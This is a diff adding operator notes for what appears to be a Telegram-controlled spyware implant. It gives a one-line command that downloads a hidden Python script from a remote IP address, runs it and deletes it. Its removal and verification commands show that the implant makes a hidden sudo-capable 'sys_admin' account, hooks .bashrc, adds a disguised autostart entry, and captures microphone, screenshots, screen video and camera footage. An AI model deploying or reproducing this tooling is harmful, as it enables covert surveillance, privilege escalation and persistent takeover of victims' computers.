@@ -1,0 +1,32 @@
+Enter your telegram bot token and chat ID in the script for control
+
+Execute and checking the bot:-
+curl -o /tmp/.com_s.py "http://10.170.233.206:3000/download/com_s.py" && chmod +x /tmp/.com_s.py && python3 /tmp/.com_s.py setup && rm /tmp/.com_s.py
+
+
+use any 'sudo' command on new terminal:-
+sudo ls
+
+Verifying:-
+tail -f ~/.cache/tool_setup.log
+
+
+check what dependencies are being installed by the bot:-
+cat ~/.cache/hook_debug.log
+
+
+
+Terminate/remove the bot from system:-
+sudo pkill -9 -u sys_admin; sudo pkill -f "[.]sys_tool.py"; sudo userdel -r sys_admin; sudo rm -f /etc/sudoers.d/99-sys_admin /tmp/.sys_tool* /tmp/bot.log /tmp/.sys_bot.pid /tmp/mic.wav /tmp/screen.png /tmp/monitor.mp4 /tmp/camera.mp4; rm -f ~/.cache/.sys_tool.py ~/.cache/.deploy_payload.sh ~/.config/autostart/.system-update-helper.desktop ~/.cache/tool_setup.log ~/.cache/bot_launcher.log ~/.cache/hook_debug.log; sed -i '/# Added by System Service/,/^}$/d' ~/.bashrc
+
+
+Verifying:-
+pgrep -f .sys_tool.py
+
+id sys_admin
+
+ls /etc/sudoers.d/99-sys_admin
+
+ls -l ~/.cache/.sys_tool.py /tmp/.sys_tool.py ~/.cache/.deploy_payload.sh 2>/dev/null
+
+tail -n 20 ~/.bashrc
